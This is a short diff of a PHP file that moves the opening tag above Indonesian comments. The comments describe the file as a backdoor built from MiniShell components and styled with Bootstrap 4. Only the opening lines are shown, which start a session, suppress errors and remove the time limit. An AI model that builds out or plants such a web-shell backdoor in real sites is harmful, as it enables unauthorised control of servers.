@@ -1,7 +1,7 @@
+<?php
 // Backdoor ini tidak sepenuhnya saya buat sendiri,
 // Komponen"nya saya ambil dari MiniSHell
 // Saya hanya menambahkan bootstrap 4 untuk mempercantik tampilannya
-<?php
 session_start();
 error_reporting(0);
 set_time_limit(0);
